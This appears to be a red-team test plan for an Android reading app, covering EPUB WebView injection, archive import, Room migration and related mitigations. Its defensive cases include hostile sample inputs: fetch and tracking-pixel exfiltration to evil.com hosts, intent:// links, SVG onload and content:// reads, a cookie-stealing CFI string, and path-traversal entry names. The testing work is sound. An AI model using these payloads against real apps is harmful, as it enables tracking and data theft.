# LECTERN-ANDROID-RED-TEAM.md — Security & Adversarial Test Suite
# Lectern Android — AuDHD-first reading app

> Security and adversarial test coverage for a local-only Android reading app
> built on Kotlin + Jetpack Compose + Readium Kotlin Toolkit 3.1.2 +
> Android TTS + Room 2.8.4 + DataStore 1.2.1 + CameraX 1.4.0 + MediaPipe
> Tasks Vision 0.10.35.
>
> Primary standard: OWASP Mobile Application Security Verification Standard v2
> (MASVS v2) — https://mas.owasp.org/MASVS/
>
> Lectern Android has NO LLM, NO backend, NO cloud sync (V1). No analytics SDK.
> OWASP LLM Top 10 does NOT apply.
>
> Primary attack surfaces:
> 1. EPUB3 content rendering via Readium Kotlin + Android WebView
> 2. File import from untrusted sources (EPUB / PDF / CBZ / CBR)
> 3. Room DB integrity and migration safety
> 4. DataStore and local storage exposure (no cloud sync in V1)
> 5. Gaze tracking pipeline — camera data + calibration weights (Android-only)
> 6. Readium Kotlin Toolkit + zip4j + junrar + EJML + MediaPipe supply chain
> 7. AuDHD-specific UI safety regressions (Compose)
> 8. Android platform security (Intents, Backup, Network Security Config)
>
> iOS tests that do NOT apply to Android: iCloud/CloudKit (no sync in V1),
> WKWebView content rules API, NSFileProtection, AVSpeechSynthesizer,
> Swift 6 actor isolation, NSPersistentCloudKitContainer.

---

## Status legend

| Symbol | Meaning |
|---|---|
| ✅ | Test exists and passes |
| ⚠️ | Test exists but documents a known issue |
| 🔴 | Test does not yet exist — needs implementation |
| 🔍 | Needs source verification before test can be written |
| ✓ | Verified from source — confirmed safe / confirmed risk |

---

## Confirmed implementation facts (from source research)

| Property | Status | Source |
|---|---|---|
| `android:allowBackup="false"` | ✓ Safe | AndroidManifest.xml |
| `data_extraction_rules.xml` excludes all sharedpref, database, file from cloud backup | ✓ Safe | data_extraction_rules.xml |
| Calibration weights excluded from D2D device transfer | ✓ Safe | data_extraction_rules.xml |
| Reading position / focus band prefs NOT excluded from D2D transfer | 🔍 Intentional or gap? | data_extraction_rules.xml |
| No custom URL scheme registered | ✓ Safe | AndroidManifest.xml |
| Only LAUNCHER intent filter; `exported="true"` on MainActivity only | ✓ Safe | AndroidManifest.xml |
| `INTERNET` permission declared but unused in V1 (comment: "for future Supabase sync") | ⚠️ Risk | AndroidManifest.xml |
| `res/xml/network_security_config.xml` with `cleartextTrafficPermitted="false"` | ✓ Added | network_security_config.xml |
| Gaze logs: only error/state messages — no iris coordinates or weights logged | ✓ Safe | GazeProviderImpl.kt, GazeViewModel.kt |
| CalibrationResult stores ridge regression weights (not raw iris UV) | ✓ Correctly abstracted | CalibrationRepository.kt |
| Raw iris UV and calibration weights never written to logcat | ✓ Confirmed | All gaze files |
| Room uses explicit migration (MIGRATION_1_2), no `fallbackToDestructiveMigration()` | ✓ Safe | AppDatabase.kt |
| Readium Kotlin 3.1.2 version pin | ✓ Pinned in version catalog | libs.versions.toml |
| zip4j 2.11.6 + junrar 7.5.7 version pins | ✓ Pinned | libs.versions.toml |
| Android WebView JS config in Readium Kotlin | ✓ Verified — JS IS enabled (setJavaScriptEnabled(true) in R2EpubPageFragment) | Readium 3.1.2 JAR decompile |
| Readium WebView host restriction — shouldInterceptRequest | ✓ Verified — only serves `host == "readium"` resources; returns null for ALL other hosts | EpubNavigatorViewModel.class |
| External resources from EPUB content | ✅ Blocked — `EpubBlockingWebViewClient` returns HTTP 403 for host != "readium" | EpubReaderFragment.kt |
| `allowContentAccess` in Readium WebViews | ⚠️ Default `true` — Readium never disables it; ✅ now set to `false` in `wrapWebViewsIn()` | EpubReaderFragment.kt |
| shouldOverrideUrlLoading intercepts ALL URLs | ✓ Verified — returns true for every URL, calls navigateToUrl() | EpubNavigatorFragment$WebViewListener.class |
| navigateToUrl() for intent:// URLs | ✓ Effectively blocked — listener is null in lectern; onExternalLinkActivated() never fires | EpubNavigatorViewModel$navigateToUrl$1.class |
| JS interface registered as window.Android | ✓ Verified — R2WebView registered as "Android" via addJavascriptInterface | R2EpubPageFragment.class |
| @JavascriptInterface methods exposed | ✓ Enumerated: onTap, onDecorationActivated, onDragStart/Move/End, onKey, onSelectionStart/End, getViewportWidth, logError | R2BasicWebView.class verbose |
| logError JS interface writes to Timber/Logcat | ⚠️ Arbitrary string from EPUB JS can be written to logcat via window.Android.logError() | R2BasicWebView.class |
| `check_gaze_data_leak.sh` CI prevents gaze terms in entity names and DataStore keys | ✓ Active | scripts/ |
| Readium 3.x EPUB extraction to disk | ✓ Never extracted — ZipContainer serves entries via InputStream on-demand; no filesystem writes from ZIP entry paths | PublicationRepository.kt, Readium 3.1.2 architecture |
| zip4j/junrar extraction to disk | ✓ Never extracted — getInputStream() only; entry names used as ZIP lookup keys, never as filesystem paths | ComicsReaderViewModel.kt |
| LibraryViewModel DISPLAY_NAME usage | ✓ Never queried — all file paths use UUID(uri.toString()); DISPLAY_NAME not referenced anywhere | LibraryViewModel.kt |
| BitmapFactory size guard in ComicsReaderViewModel | ✅ Fixed — two-pass inJustDecodeBounds + inSampleSize caps bitmap at 2048×2048 max | ComicsReaderViewModel.kt |
| DefaultHttpClient in PublicationRepository | ✅ Replaced with BlockingHttpClient — all Readium HTTP calls unconditionally rejected | PublicationRepository.kt, BlockingHttpClient.kt |

---

## Section A — EPUB3 content injection via Readium Kotlin + Android WebView

> Readium Kotlin renders EPUB3 content inside an `EpubNavigatorFragment` backed
> by an Android WebView. EPUB3 supports JavaScript, CSS, SVG, audio, video, and
> MathML. A malicious EPUB is the primary injection surface.
>
> MASVS-PLATFORM-1: The app uses WebViews securely.
> References: CVE-2021-40870 (Readium-2 path traversal), EPUB3 W3C Security
> Considerations, Android WebView security hardening guide.

**A.1** `epub_javascriptExecutionDisabledOrSandboxed` ⚠️
- MASVS: MASVS-PLATFORM-1
- Attack: Open an EPUB3 file containing JavaScript that attempts `window.location = "intent://..."`, `fetch("https://evil.com")`, or `window.Android.logError(sensitiveData, "", 0)`.
- ✓ CONFIRMED: `setJavaScriptEnabled(true)` — JS IS enabled in `R2EpubPageFragment.onCreateView()`.
- ✓ CONFIRMED: `R2WebView` registered as JS interface `window.Android`. Exposed `@JavascriptInterface` methods:
  - `onTap(String)`, `onDecorationActivated(String)`, `onDragStart/Move/End(String)`, `onKey(String)` — navigation/decoration events (low risk, no native capabilities)
  - `onSelectionStart()`, `onSelectionEnd()` — text selection events (low risk)
  - `getViewportWidth() → Int` — read-only, no risk
  - **`logError(String message, String filename, Int)` ⚠️** — malicious EPUB JS can write arbitrary strings to Logcat via `window.Android.logError(exfiltrated_data, "", 0)`. On debug builds, Logcat is readable by other apps. Not a data exfiltration path on release builds but enables log poisoning.
- ✓ MITIGATED for navigation injection: `shouldOverrideUrlLoading` catches top-level frame navigations. `intent://` via `<a href>` click is blocked (see A.3).
- ⚠️ UNMITIGATED: `fetch()` and `XMLHttpRequest` to external HTTP/HTTPS from EPUB JS are NOT blocked (see A.2).
- Decoration JS interfaces (map-registered, names vary) are also exposed — scope unknown, treat as additional bridge surface.
- ✓ IMPLEMENTED (partial): External JS network calls are now blocked by `EpubBlockingWebViewClient` (A.2 fix). `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs` are false by default and not overridden. `evaluateJavascript()` in `EpubNavigatorFragment` is called only with Readium-internal scripts, never with EPUB-controlled data.
- ⚠️ REMAINING: `logError` unbounded string payload — accepted risk on release builds (`debuggable=false`). Test: verify `android:debuggable` absent from release manifest.
- Pass criteria (remaining): confirm `logError` string length is bounded or sanitised in a future Readium patch.

**A.2** `epub_externalResourceLoadingBlocked` 🔴
- MASVS: MASVS-PLATFORM-1 · MASVS-NETWORK-1
- Attack: EPUB3 content contains `<img src="https://tracker.evil.com/pixel.png">` or `<script src="https://evil.com/payload.js">`.
- ✓ CONFIRMED RISK: `WebViewServer.shouldInterceptRequest()` checks `request.url.host == "readium"`. For ANY other host, it returns `null` — the WebView uses its default network stack and the request GOES OUT.
  ```
  // From decompiled EpubNavigatorViewModel.shouldInterceptRequest():
  if (host != "readium") return null  // ← WebView handles normally = network fetch
  ```
- Compound risk with H.1: No `network_security_config.xml`. On Android 8 (minSdk 26), cleartext HTTP is allowed. Tracking beacons over HTTP are not blocked by the OS.
- Privacy impact: A malicious EPUB author can track which books are opened and when via `<img>` beacon. Reading position can be encoded in query params: `<img src="https://t.evil.com/?pos=ch3&t=1234">`. This is especially sensitive for AuDHD users whose reading habits may reveal medical context.
- Compound risk with A.1: EPUB JS can make `fetch("https://evil.com/collect?data=...")` — no JS sandbox, no CSP enforced by Readium.
- ✅ IMPLEMENTED: `EpubBlockingWebViewClient` wraps each `R2EpubPageFragment`'s WebViewClient via `FragmentLifecycleCallbacks`. Returns a blocking `WebResourceResponse` for any host != "readium". Registered in `EpubReaderFragment.setupNavigator()` on `fragment.childFragmentManager`.
- ✅ IMPLEMENTED (defense-in-depth): `network_security_config.xml` with `cleartextTrafficPermitted="false"` blocks cleartext HTTP at the OS level independently (addresses H.1).
- Test: open EPUB with `<img src="https://external.com/pixel.png">` — verify in Network Profiler that no outbound request is made. Verify chapter navigation still works (https://readium/ resources load correctly).

**A.3** `epub_intentSchemeInjection` ⚠️
- MASVS: MASVS-PLATFORM-3
- Attack: EPUB3 content contains `<a href="intent://settings#Intent;scheme=android-app;package=com.android.settings;end">` or `<a href="market://details?id=com.evil.app">`.
- ✓ EFFECTIVELY MITIGATED (by accident): Flow for any link click:
  1. `EpubNavigatorFragment$WebViewListener.shouldOverrideUrlLoading()` → returns `true` for ALL URLs → calls `viewModel.navigateToUrl(url)`
  2. `navigateToUrl()` → `internalLinkFromUrl(url)` — `intent://` URL cannot relativize against `readium://` baseUrl → returns `null`
  3. `navigateToUrl()` → `listener.onExternalLinkActivated(url)` — **lectern passes `listener = null`** to `createFragmentFactory()` (only `initialLocator` + `initialPreferences` are passed)
  4. Null listener → onExternalLinkActivated() never called → Intent never fired → URL silently dropped ✓
- ✓ HARDENED (Sprint 17): `EpubBlockingWebViewClient.shouldOverrideUrlLoading()` now has an explicit scheme allowlist (`ALLOWED_NAVIGATION_SCHEMES = setOf("https", "http")`). Any URL whose scheme is not "https" or "http" returns `true` (consumed) before delegating to Readium. This blocks `intent://`, `market://`, `javascript:`, `content://`, `file://`, and any future custom scheme — regardless of whether the null-listener path is intact.
- ✅ REGRESSION TESTS:
  - `GroupASecurityTest.epub_noExternalLinkListener_classDeclaresNoListenerInterface` — null-listener invariant
  - `GroupASecurityTest.epub_blockingWebViewClient_shouldOverrideUrlLoading_schemeDenylist` — scheme allowlist + `return true` guard (Sprint 17)
- Pass criteria: Write a test that clicks an `intent://` link in an EPUB — verify no system dialog appears and no Activity is started.
- Android-specific: iOS has no equivalent `intent://` scheme risk.

**A.4** `epub_cssInjection_noNativeUiOverlay` ✅ MITIGATED (architectural)
- MASVS: MASVS-PLATFORM-1
- Attack: EPUB3 CSS contains `position: fixed; top: 0; z-index: 99999; width: 100vw; height: 100vh` overlaying the content. In Android WebView, CSS is scoped to the WebView viewport — Compose UI above it cannot be overlaid. Verify.
- ✓ CONFIRMED SAFE (Android View system): WebView composited layers are sandboxed to the WebView's `getClipBounds()` rectangle. CSS `position: fixed; z-index: 99999` cannot escape the WebView View boundary. The ComposeView (overlay) is a sibling FrameLayout child added AFTER the navigator container — it occupies the same FrameLayout z-order position and is drawn on top of the WebView by the Android View hierarchy. EPUB CSS cannot paint outside the WebView's allocated screen region.
- ✓ NO CODE CHANGE NEEDED: Architectural guarantee from the Android View compositing model. This is a fundamental difference from iOS WKWebView (which can use `UIWindowLevel` to escape normal view hierarchy).
- Pass criteria: Open an EPUB with `position: fixed; z-index: 2147483647; width: 100vw; height: 100vh; background: red` CSS — verify the `ReaderOverlay` toolbar remains visible and interactable above the WebView. Verify with Android GPU Profiler layer visualisation.
- Note: Lower risk than iOS because WebView is a bounded View in Fragment, not a full-screen sheet with separate `UIWindow`.

**A.5** `epub_svgXssInjection` ✅ IMPLEMENTED
- MASVS: MASVS-PLATFORM-1
- Attack: EPUB3 content contains inline SVG with `<script>` tag or `onload` attribute, plus SVG-embedded `xlink:href` pointing to external resources or using `data:` URIs to access app `content://` data.
- ✓ SVG `<script>` execution: Covered by A.1 — JS IS enabled by Readium but `EpubBlockingWebViewClient` blocks all external resource loads (host != "readium"). SVG inline scripts execute in the same Chromium sandbox as EPUB JS — no additional surface beyond A.1/A.2.
- ✅ IMPLEMENTED: `allowContentAccess = false` set on each page WebView in `EpubReaderFragment.wrapWebViewsIn()`. Readium's asset server uses `https://readium/` exclusively — `content://` URIs are never needed. This closes the SVG `xlink:href="content://..."` surface: EPUB SVG cannot read app data (contacts, media store, DataStore files) via content provider scheme.
- ✓ `allowFileAccess`: Android API 30+ defaults to `false`. Not explicitly set by Readium — safe on targetSdk 36.
- ✓ `allowUniversalAccessFromFileURLs` / `allowFileAccessFromFileURLs`: Both `false` by default, not overridden by Readium.
- Pass criteria: Open an EPUB containing SVG with `<image xlink:href="content://com.android.contacts/data/1" />` — verify no contact data is returned. Open an EPUB with `<svg onload="window.Android.logError(document.cookie,'',0)">` — verify cookies are empty and no sensitive data in logcat.
- See also: A.2 (external resource blocking), A.1 (JS interface surface).

**A.6** `epub_malformedContainer_noCrash` ✅ MITIGATED (Readium Result types + ViewModel error handling)
- MASVS: MASVS-CODE-4
- Attack: Import an EPUB with: malformed `container.xml`, missing OPF spine, zero-byte content documents, intentionally corrupt ZIP structure.
- ✓ CONFIRMED SAFE (architecture): Readium Kotlin returns `Try<Publication, OpenError>` sealed Result types from all parser APIs — exceptions are not thrown to the caller. `LibraryViewModel.importBook()` exhaustively handles `Try.Failure` via a `when` branch that emits to `_importError` StateFlow → displayed as a Snackbar. No crash path reaches the UI for any Readium parse error.
- ✓ ZIP corruption: `DefaultStreamer` wraps the ZIP archive reader; all IO exceptions are caught and wrapped in `OpenError.NotFound` or `OpenError.Forbidden`. Room records are only written after a successful `Publication` object is returned — a parse failure before that point leaves the database unchanged.
- ✓ Missing OPF/spine: Readium returns `OpenError.ContentReaders.CannotReadMediaType` — also a `Try.Failure`.
- ⚠️ ZIP bombs: Readium 3.1.2 does not enforce a maximum decompressed entry size. Covered by B.1 (separate test case).
- Pass criteria: Import an EPUB with truncated ZIP signature (`PK\x03\x04` header only, no data) — verify a Snackbar error appears within 3 seconds, no crash, no new Room record created. Import a well-formed EPUB immediately after — verify it imports correctly (no state corruption).
- Source: AFL/libFuzzer patterns for ZIP/XML parsers; Readium source review of `DefaultStreamer.open()`.

**A.7** `epub_annotationXssViaCfiString` ✅ MITIGATED (JSONObject escaping)
- MASVS: MASVS-PLATFORM-1 · MASVS-STORAGE-1
- Attack: Craft an EPUB with a CFI locator string containing JavaScript injection characters (e.g., `epubcfi(/6/4[ch01]!/4/2/1,");alert(document.cookie);//,/1:0)`). Verify CFIs are stored and restored as opaque strings with no eval path.
- ✓ CONFIRMED SAFE (JSONObject escaping): Readium serialises `Locator` objects to JSON using Kotlin `JSONObject.toString()` before passing to `evaluateJavascript()`. `JSONObject.toString()` fully escapes `"`, `\`, and control characters in all string values. A CFI string like `");alert(1);//` becomes `\");alert(1);//` inside the JSON — it cannot break out of the string literal in the `readium.scrollToLocator({"href":"...","locations":{"cfi":"..."}})`  call.
- ✓ Storage path: `LocatorRepository` stores the JSON-serialised locator as a DataStore `String` preference and reads it back as an opaque string. No exec or eval occurs at restore time — the string is passed directly to `EpubNavigatorFragment.go(locator)` which uses the Readium Kotlin parser, not an `eval()` call.
- ✓ No second eval path: `EpubNavigatorViewModel.evaluateJavascript()` is called only with Readium-internal script templates; CFI values are always embedded as JSON properties, never string-concatenated directly into JS.
- Pass criteria: Create a `Locator` with CFI `epubcfi(/6/4!/");alert(document.cookie);//)` — save and restore reading position — verify no alert fires, no cookie in logcat. Verify locator JSON in DataStore file contains the properly escaped string.
- Note: If Readium ever switches from `JSONObject` to manual string interpolation, this guarantee breaks. Monitor Readium changelog for serialisation changes.

---

## Section B — File import from untrusted sources

> `LibraryViewModel.importBook()` accepts EPUB, PDF, CBZ, and CBR files via
> Android's `ACTION_OPEN_DOCUMENT` picker. Content is delivered as a `content://`
> URI. All imported files are untrusted external content.
>
> EPUB extraction: Readium Kotlin (internal).
> CBZ extraction: zip4j 2.11.6.
> CBR extraction: junrar 7.5.7.
> PDF: Android PdfRenderer (system).

**B.1** `fileImport_zipBombEpub` ✅ MITIGATED (architectural — renderer-process isolation)
- MASVS: MASVS-CODE-4
- Attack: Import an EPUB with ZIP entries that decompress to gigabytes of HTML/CSS.
- ✓ CONFIRMED SAFE (no disk extraction): Readium Kotlin 3.x never extracts EPUB ZIP entries to disk. `AssetRetriever` wraps the `content://` URI as a `ContentAsset`; `ZipContainer` decompresses entries on-demand via `InputStream` and streams them to the WebView via `WebViewServer.shouldInterceptRequest()`. No storage exhaustion possible.
- ⚠️ REMAINING (renderer OOM, accepted): If a chapter entry decompresses to gigabytes of HTML, Chromium's renderer process may OOM. Android runs the WebView renderer in an isolated process; the app process survives and `onRenderProcessGone` fires. This is a crash-only outcome — no data corruption, no storage impact. Accepted risk for V1.
- ✓ Import-path cover: `extractAndSaveCover()` calls `pub.cover()` — Readium 3.x applies internal downsampling (target ≤ 512×512) before returning the bitmap. OOM at import time is unlikely.
- Pass criteria: Import a crafted EPUB with a 500 MB HTML chapter — verify no storage exhaustion, no Room record created on failure, and app remains usable after the WebView renderer restarts.
- CVE-2021-40870 note: That CVE was in Readium-2 (Streamer) which DID extract EPUBs to a temp directory. Readium Kotlin 3.x (PublicationOpener + DefaultPublicationParser) does not. Architecture change eliminates the disk-write path entirely.

**B.2** `fileImport_zipBombCbz` ✅ IMPLEMENTED — two-pass BitmapFactory decode with dimension cap
- MASVS: MASVS-CODE-4
- Attack: CBZ/CBR entry with name `page001.png` (passes `isImageFile` filter) containing a PNG with IHDR dimensions of 10000×10000. `BitmapFactory.decodeStream()` with no guard allocates 10000×10000×4 bytes = 400 MB → OOM in the app process. Crash loses reading progress for all open books.
- ✅ IMPLEMENTED: `ComicsReaderViewModel.renderZipPage()` and `renderRarPage()` now use two-pass decode:
  1. Pass 1 — `inJustDecodeBounds = true` reads only the image header (≤ 4 KB, no pixel allocation)
  2. `calculateInSampleSize(outWidth, outHeight)` computes the smallest power-of-2 that brings both axes to ≤ `MAX_BITMAP_DIM = 2048`
  3. Pass 2 — full decode with the computed `inSampleSize`
- ✓ Worst-case allocation after fix: 2048×2048×4 = 16 MB per page — safe on minSdk 26 (heap ≥ 64 MB)
- ✓ zip4j: `ZipFile.getInputStream(FileHeader)` returns a fresh stream per call — two-pass is safe
- ✓ junrar: `Archive` is already re-opened per `renderPage` call; opening twice for two-pass is consistent with existing sequential-read pattern
- ✓ Unknown format (`outWidth = -1`): `calculateInSampleSize` returns 1 (safe fallback)
- ✓ High-quality scans at 3000–4000 px get `inSampleSize = 2` → 1500–2000 px output — still crisp on typical Android screens
- Pass criteria: Open a CBZ with a PNG entry with IHDR `width=20000, height=20000` — verify the app does not crash, page renders (subsampled), reading progress is preserved.
- Android-specific: No equivalent risk in iOS (EPUB/PDF only).

**B.3** `fileImport_pathTraversal_cbz` ✅ SAFE (no extraction to disk)
- MASVS: MASVS-STORAGE-1
- Attack: CBZ/CBR archive contains entries with `../../` paths targeting app database or DataStore files.
- ✓ CONFIRMED SAFE: zip4j is used exclusively via `ZipFile.getInputStream(FileHeader)` — `extractAll()` and `extractFile()` are never called. Entry names are stored in `pageEntries` and used only as lookup keys in `zip.getFileHeader(entry)`. No filesystem writes occur from archive entry names.
- ✓ Same for junrar: `Archive.getInputStream(FileHeader)` only. No `Archive.extractEntry()` calls.
- ✓ `uriToFile()` copies the archive as a flat opaque blob to `cacheDir/<UUID>` — the UUID is derived from the URI string, not from any archive-internal path. No traversal possible at the copy step.
- Pass criteria: Import a CBZ with an entry named `../../../../data/data/com.straysouth.lectern/databases/lectern.db` — verify the database file is not modified.
- CWE-22: Not applicable because no extraction-to-disk path exists.
- ✅ REGRESSION TEST: `GroupBSecurityTest.cbz_pathTraversalEntry_getInputStreamDoesNotExtract` — creates a ZIP with entry `../../traversal_target.png`, reads via `Zip4jFile.getInputStream()`, asserts filesystem is unchanged.

**B.4** `fileImport_pathTraversal_epub` ✅ SAFE (Readium 3.x no-extraction architecture)
- MASVS: MASVS-STORAGE-1
- Attack: EPUB ZIP contains entries with `../../databases/lectern.db` path components.
- ✓ CONFIRMED SAFE: Readium Kotlin 3.x (`PublicationOpener` + `DefaultPublicationParser` + `AssetRetriever`) never extracts EPUB ZIP entries to disk. The `ContentAsset` wraps the `content://` URI; `ZipContainer` reads entries via `ZipInputStream` and serves them via `WebViewServer.shouldInterceptRequest()`. No file write originates from a ZIP entry path.
- ✓ CVE-2021-40870 (Readium-2 path traversal): That vulnerability exploited the Readium-2 Streamer's extraction of EPUB files to a temporary directory. Readium Kotlin 3.x redesigned publication opening to be stream-based. The disk-write path no longer exists.
- Pass criteria: Import an EPUB with a ZIP entry named `../../databases/lectern.db` — verify the database is not modified. Import a valid EPUB immediately after — verify it opens correctly.
- ✅ REGRESSION TEST (Sprint 18 — androidTest): `EpubImportTest.epub_pathTraversalZipEntry_readiumDoesNotExtractToDisk` — creates a ZIP with entry `../../files/canary_b4.txt`, calls `PublicationRepository.open()`, asserts canary file does not appear in `filesDir`.

**B.5** `fileImport_contentUri_pathTraversal` ✅ SAFE (no DISPLAY_NAME usage in file paths)
- MASVS: MASVS-STORAGE-1
- Attack: Malicious app provides `content://` URI with `DISPLAY_NAME` returning `../../lectern.db`.
- ✓ CONFIRMED SAFE: `LibraryViewModel` never queries `DISPLAY_NAME` from the content resolver. All file path construction uses deterministic UUIDs:
  - Book ID: `UUID.nameUUIDFromBytes(uri.toString().toByteArray(Charsets.UTF_8))` — keyed on URI string
  - Cover: saved to `filesDir/cover_$id.png` — ID is the UUID above
  - Cache file (`uriToFile`): `File(cacheDir, UUID.nameUUIDFromBytes(uri.toString().toByteArray()))` — same pattern
- ✓ Book title: derived from `uri.lastPathSegment?.substringBeforeLast('.')` or from EPUB metadata — stored as metadata only, never used in a file path.
- Pass criteria: Use a `ContentProvider` that returns `DISPLAY_NAME = "../../../../databases/lectern.db"` — verify no file is created outside the app sandbox.
- ✅ REGRESSION TESTS: `GroupBSecurityTest` — `bookCacheId_sameUri_returnsSameId`, `bookCacheId_outputIsUuidFormat`, `bookCacheId_isKeyedOnFullUri_notFilenameSegment`, `bookCacheId_traversalInDisplayName_hasNoEffect`, `bookCacheId_nonAsciiUri_stableAcrossCalls`.

**B.6** `fileImport_nonEpubMasqueradingAsEpub` ✅ SAFE (parser validation + Result error chain)
- MASVS: MASVS-CODE-4
- Attack: File with `.epub` extension (or MIME `application/epub+zip`) containing binary data or malformed XML.
- ✓ CONFIRMED SAFE: `detectFormat()` maps to `FORMAT_EPUB` by extension or MIME → `importEpub()` → `pubRepository.open(uri)` → `AssetRetriever.retrieve(url)` → `DefaultPublicationParser.parse()`. If the content is not a valid EPUB ZIP, `AssetRetriever` returns failure (ZIP signature check). If ZIP but no `META-INF/container.xml`, `DefaultPublicationParser` returns `Try.Failure(OpenError.ContentReaders.CannotReadMediaType)`.
- ✓ Room row written only on success: `bookDao.upsert(...)` is called only after `pub` is obtained from `Result.success`. A parse failure returns before the upsert.
- ✓ Error surfaced: `_importError.value = getString(R.string.import_error_epub_open)` → Snackbar.
- Pass criteria: Import a `.epub` file containing `PK\x03\x04` header + random bytes (valid ZIP header but no container.xml) — verify Snackbar error, no crash, no Room record.
- ✅ REGRESSION TESTS (Sprint 18 — androidTest):
  - `EpubImportTest.epub_randomBytesContent_openReturnsFailure` — 256 random bytes, no ZIP signature → `Result.isFailure`
  - `EpubImportTest.epub_validZipMissingContainerXml_openReturnsFailure` — valid ZIP, no `META-INF/container.xml` → `Result.isFailure`

**B.7** `fileImport_duplicateBook_noDataCorruption` ✅ SAFE (deterministic UUID + REPLACE strategy)
- MASVS: MASVS-STORAGE-1
- Attack: Import same EPUB twice; import two EPUBs with identical metadata.
- ✓ CONFIRMED SAFE: `bookCacheId(uri.toString())` produces a stable UUID. Same URI → same UUID → `BookDao.upsert()` with `OnConflictStrategy.REPLACE` → row updated in-place. `ReadingProgress` and locator rows are keyed on book ID — they survive the upsert (no cascade delete).
- ✓ Different URI, same content: different UUID → separate rows. Expected behavior.
- Pass criteria: Import EPUB X; open it and read to page 5 (creates `ReadingProgress`); import EPUB X again — verify reading progress still shows page 5, library shows one entry, no crash.
- ✅ REGRESSION TESTS:
  - `GroupBSecurityTest` JVM — `bookCacheId_idempotent_onDuplicateImport`, `bookCacheId_differentUri_differentId_evenIfSameContent`
  - `DuplicateImportDbTest` androidTest (Sprint 18) — three tests verifying REPLACE upsert does not cascade-delete `reading_progress`: progress survives, library shows one entry, `totalProgression` is preserved.

**B.8** `fileImport_readiumHttpClientExfil` ✅ IMPLEMENTED — BlockingHttpClient replaces DefaultHttpClient
- MASVS: MASVS-NETWORK-1 · MASVS-PLATFORM-1
- Attack: EPUB `META-INF/container.xml` references remote OPF: `<rootfile full-path="https://tracker.evil.com/collect?u=UUID" ...>`. Readium's `DefaultPublicationParser` uses `DefaultHttpClient` to fetch it during `importEpub()` — not intercepted by `EpubBlockingWebViewClient` (WebView-only).
- ✅ IMPLEMENTED: New `BlockingHttpClient` object implements `HttpClient` and unconditionally returns `Try.failure(HttpError.IO(...))` for every request. `PublicationRepository` now uses `BlockingHttpClient` for both `AssetRetriever` and `DefaultPublicationParser`.
- ✓ Cascade verified:
  - `AssetRetriever.retrieve(content://...)` uses the ContentResolver path, not HTTP — unaffected
  - `WebViewServer.shouldInterceptRequest()` is independent of `HttpClient` — chapter serving, TTS, decorations, gaze all unaffected
  - EPUB with remote OPF: `assetRetriever.retrieve()` fails → `Result.failure` → `_importError` Snackbar — correct error handling for non-standard EPUB
- ✓ No `DefaultHttpClient` usage remains in the codebase
- Pass criteria: Import a crafted EPUB with `container.xml` referencing `https://tracker.evil.com/collect?id=test` — verify in Network Profiler that no outbound HTTPS request fires. Verify a valid local EPUB imports, displays, and TTS works correctly after the fix.

---

## Section C — Room database integrity and migration safety

> Room 2.8.4 backs all book metadata and reading progress.
> No cloud sync in V1 — Room is the authoritative source of truth.
> `exportSchema = true` — schema JSON is committed.

**C.1** `room_migration_v1v2_noDataLoss` 🔴
- MASVS: MASVS-STORAGE-1
- Attack: Install v1 (schema without `format` column). Migrate to v2. Verify all existing books, reading progress records survive. Verify `format` defaults to `'EPUB'` for pre-migration rows.
- Pass: All pre-v2 `books` rows accessible post-migration with `format = 'EPUB'`. Zero dropped records. `schemas/2.json` matches the live schema.
- Source: `MIGRATION_1_2` in `AppDatabase.kt`.
- ✅ REGRESSION TESTS (Sprint 16 — androidTest):
  - `RoomMigrationTest.migration1to2_existingBookGetsEpubDefault` — creates v1 DB, inserts book + progress, migrates, asserts format='EPUB' and progress intact
  - `RoomMigrationTest.migration1to2_multipleBooks_allSurvive` — asserts row count preserved across migration

**C.2** `room_noFallbackToDestructiveMigration` ✅ SAFE (source-confirmed) + regression test
- MASVS: MASVS-STORAGE-1
- Attack: Install a version with a schema version that has no defined migration (simulating a future sprint skip). Verify Room throws `IllegalStateException` rather than silently destroying user data.
- ✓ CONFIRMED SAFE: `fallbackToDestructiveMigration()` is NOT present in `AppDatabase.getInstance()`. Room throws `IllegalStateException` on schema mismatch without a registered migration.
- ✅ REGRESSION TEST: `GroupCSecurityTest.appDatabase_builderDoesNotCallFallbackToDestructiveMigration` — source text assertion guards against future re-introduction.
- ⏳ DEFERRED (runtime half): Instrumented test verifying Room throws `IllegalStateException` on unmigrated version bump deferred to `androidTest/` sprint.

**C.3** `room_concurrentWrite_noConflict` 🔴
- MASVS: MASVS-CODE-3
- Attack: Trigger simultaneous Room writes from two coroutines: `BookDao.upsert(book)` and `ReadingProgressDao.upsertProgress(progress)` with a shared `bookId`. Verify no `SQLiteConstraintException` or `IllegalStateException`.
- Pass: Room DAO operations use `suspend` on correct dispatchers (main-safe, Room internally dispatches to IO). No conflict. All operations complete.
- ✅ REGRESSION TESTS (Sprint 16 — androidTest):
  - `RoomConcurrencyTest.concurrentBookAndProgressWrite_bothComplete` — two concurrent IO-dispatch upserts (books + reading_progress) complete without exception
  - `RoomConcurrencyTest.concurrentUpserts_sameBook_lastWriteWins` — REPLACE conflict on same PK does not throw; row survives

**C.4** `room_deleteBook_cascadeProgress` ✅ SAFE (source-confirmed) + regression test
- MASVS: MASVS-STORAGE-1
- Attack: Delete a book. Verify `ReadingProgress` rows with the deleted `bookId` are also deleted. No FK cascade is defined in the schema — `LibraryViewModel.deleteBook()` calls `ReadingProgressDao.deleteByBookId` explicitly.
- ✓ CONFIRMED: No `@ForeignKey` between `books` and `reading_progress`. `bookId` in `reading_progress` is a bare nullable TEXT column. Orphan cleanup is manual.
- ✓ CONFIRMED: `LibraryViewModel.deleteBook()` calls both `bookDao.deleteById(id)` AND `readingProgressDao.deleteByBookId(id)` in the same coroutine block.
- ✅ REGRESSION TESTS:
  - `GroupCSecurityTest.libraryViewModel_deleteBook_callsDeleteByBookId` — source text assertion guards the cascade call from being removed
  - `DeleteBookDbTest.deleteBook_thenDeleteByBookId_progressIsGone` — DB behavior: after both deletes, no progress row with that bookId remains (Sprint 16 — androidTest)
  - `DeleteBookDbTest.deleteBook_otherProgressUnaffected` — sibling book's progress survives the delete

**C.5** `room_schemaJson_committed_notDrifted` ✅ IMPLEMENTED — schema JSON integrity tests
- MASVS: MAVSV-CODE-3
- Attack: Modify a Room entity without updating `version` or migration. Verify the committed `schemas/*.json` files are not silently stale.
- ✓ Both `1.json` and `2.json` committed. Identity hashes: `187531121d9fe06eec1def42f91a6b93` (v1), `3f5b9ab23f084f68bf34e8a4d0c00cdb` (v2).
